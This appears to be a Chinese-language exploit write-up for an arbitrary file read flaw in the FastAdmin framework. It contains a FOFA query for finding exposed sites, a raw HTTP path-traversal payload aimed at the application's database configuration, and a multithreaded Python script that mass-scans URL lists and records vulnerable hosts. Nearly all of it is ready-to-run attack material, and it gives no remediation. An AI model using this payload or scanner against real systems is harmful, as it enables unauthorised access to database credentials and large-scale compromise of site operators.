### fofa

```markdown
app="FastAdmin"
```

### payload

```markdown
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image-20240913084150351](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240913084150351.png)

### 命令

```markdown
python3 脚本文件名 -u url			# 单个检测
python3 脚本文件名 -f url.txt		# 批量检测
```

### poc

```python
import requests, argparse, sys, json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-13
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='FastAdmin框架 任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/index/ajax/lang?lang=../../application/database'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }
    try:
        response1 = requests.get(url=url, headers=headers, verify=False, timeout=5)
        # 检查响应状态码
        if response1.status_code == 200 and "type" in response1.text:
            print(f"{GREEN}[+] 存在任意文件读取漏洞：{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-] 不存在任意文件读取漏洞!")
    except Exception as e:
        print("[*] 无法访问")

if __name__ == '__main__':
    main()
```

